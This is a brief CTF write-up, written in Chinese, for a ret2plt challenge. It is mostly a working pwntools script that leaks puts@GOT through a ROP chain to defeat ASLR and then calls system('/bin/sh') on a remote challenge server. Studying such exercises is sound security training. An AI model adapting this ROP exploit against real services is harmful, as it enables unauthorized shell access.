## binary5

題目必須利用ROP bypass ASLR，先ROP ret到`puts@plt`，然後利用puts leaks出`puts@GOT`的位址，接著跳回`main()`，再次buffer overflow執行`system('/bin/sh')`

### exploit
```python
#!/usr/bin/env python3
from pwn import *
import time

context.update(arch='amd64', os='linux')

binary = ELF('ret2plt')
libc = ELF('libc.so.6')
rop = ROP(binary)

payload1 = cyclic(40).encode()
payload1 += flat(rop.rdi.address, binary.got[b'puts']) # rdi = puts@got
payload1 += p64(binary.plt[b'puts']) # ret to puts@plt
payload1 += p64(binary.symbols[b'main']) # ret to main()

r = remote('pwnhub.tw', 56026)
r.sendline(payload1)

r.recvuntil("boom !\n")
puts_addr = r.recvuntil("\n", drop=True)
puts_addr = int.from_bytes(puts_addr, byteorder='little')
base = puts_addr - libc.symbols[b'puts']

sh_addr = base + next(libc.search('/bin/sh\x00'))
system_addr = base + libc.symbols[b'system']

payload2 = cyclic(40).encode()
payload2 += flat(rop.rdi.address, sh_addr) # rdi = "/bin/sh"
payload2 += p64(system_addr) # ret to system()
r.sendline(payload2)
r.interactive()
```
